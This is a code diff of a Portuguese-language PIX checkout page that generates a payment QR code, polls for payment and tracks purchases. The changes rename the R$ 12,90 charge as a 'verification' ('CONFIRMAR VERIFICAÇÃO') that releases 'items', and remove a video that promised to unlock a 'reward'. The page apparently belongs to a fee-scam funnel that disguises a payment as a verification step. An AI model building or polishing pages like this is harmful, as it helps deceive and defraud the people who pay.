-if(!code){btn.disabled=false;btn.textContent='SIM! QUERO TUDO POR R$ 19,90';alert('Erro ao gerar PIX. Tente novamente.');return;}
+if(!code){btn.disabled=false;btn.textContent='CONFIRMAR VERIFICAÇÃO — R$ 12,90';alert('Erro ao gerar PIX. Tente novamente.');return;}
 pixCode=code;
 document.getElementById('cta-area').style.display='none';
 document.getElementById('pix-area').classList.add('active');
@@ -221,7 +239,7 @@ document.getElementById('pix-qr-img').src='https://api.qrserver.com/v1/create-qr
 document.getElementById('pix-code-box').textContent=code;
 if(txHash)startPolling();
 })
-.catch(function(err){btn.disabled=false;btn.textContent='SIM! QUERO TUDO POR R$ 19,90';alert('Erro: '+err.message);});
+.catch(function(err){btn.disabled=false;btn.textContent='CONFIRMAR VERIFICAÇÃO — R$ 12,90';alert('Erro: '+err.message);});
 }
 function copiarPix(){
 if(!pixCode)return;var btn=document.getElementById('pix-copy-btn');
@@ -229,35 +247,7 @@ if(navigator.clipboard){navigator.clipboard.writeText(pixCode).then(function(){b
 else{var ta=document.createElement('textarea');ta.value=pixCode;document.body.appendChild(ta);ta.select();document.execCommand('copy');document.body.removeChild(ta);btn.textContent='COPIADO!';btn.classList.add('copied');setTimeout(function(){btn.textContent='COPIAR CODIGO PIX';btn.classList.remove('copied');},3000);}
 }
 function isPaid(d){if(!d)return false;if(d.status==='paid'||d.status==='approved')return true;if(d.payment_status==='paid'||d.payment_status==='approved')return true;if(d.data&&(d.data.status==='paid'||d.data.status==='approved'))return true;return false;}
-function startPolling(){pollInterval=setInterval(function(){fetch('/api/check-tx?hash='+txHash).then(function(r){return r.json();}).then(function(data){if(isPaid(data)){clearInterval(pollInterval);var st=document.getElementById('pix-status');st.className='pst paid';st.textContent='PAGAMENTO CONFIRMADO! Seus itens serao creditados em instantes.';try{if(typeof fbq==='function')fbq('track','Purchase',{value:19.90,currency:'BRL'});}catch(e){}setTimeout(function(){window.location.href='obrigado.html';},3000);}}).catch(function(){});},5000);}
-function pularOferta(){window.location.href='downsell.html';}
-</script>
-
-<!-- VSL Modal -->
-<div class="vsl-overlay" id="vslModal">
-    <div class="vsl-inner">
-        <button class="vsl-close" id="closeVsl">FECHAR ✕</button>
-        <div class="vsl-video-wrap">
-            <video id="vslVideo" playsinline controlslist="nodownload">
-                <source src="https://i.imgur.com/fVt7L3U.mp4" type="video/mp4">
-            </video>
-            <div class="vsl-play" id="playOverlay">
-                <button class="vsl-play-btn">▶</button>
-            </div>
-        </div>
-        <p class="vsl-text">🍃 Assista até o final para liberar sua recompensa!</p>
-    </div>
-</div>
-
-<script>
-var modal=document.getElementById('vslModal'),vid=document.getElementById('vslVideo'),
-    overlay=document.getElementById('playOverlay'),closeBtn=document.getElementById('closeVsl');
-function closeModal(){modal.style.display='none';vid.pause();}
-overlay.addEventListener('click',function(){overlay.style.opacity='0';setTimeout(function(){overlay.style.display='none';},300);vid.play().catch(function(){});});
-vid.addEventListener('click',function(){if(!vid.paused){vid.pause();overlay.style.display='flex';setTimeout(function(){overlay.style.opacity='1';},10);}});
-vid.addEventListener('ended',closeModal);
-closeBtn.addEventListener('click',closeModal);
-modal.addEventListener('click',function(e){if(e.target===modal)closeModal();});
+function startPolling(){pollInterval=setInterval(function(){fetch('/api/check-tx?hash='+txHash).then(function(r){return r.json();}).then(function(data){if(isPaid(data)){clearInterval(pollInterval);var st=document.getElementById('pix-status');st.className='pst paid';st.textContent='VERIFICAÇÃO CONFIRMADA! Seus itens serao liberados em instantes.';try{if(typeof fbq==='function')fbq('track','Purchase',{value:12.90,currency:'BRL'});}catch(e){}setTimeout(function(){window.location.href='obrigado.html';},3000);}}).catch(function(){});},5000);}
 </script>
 </body>
 </html>
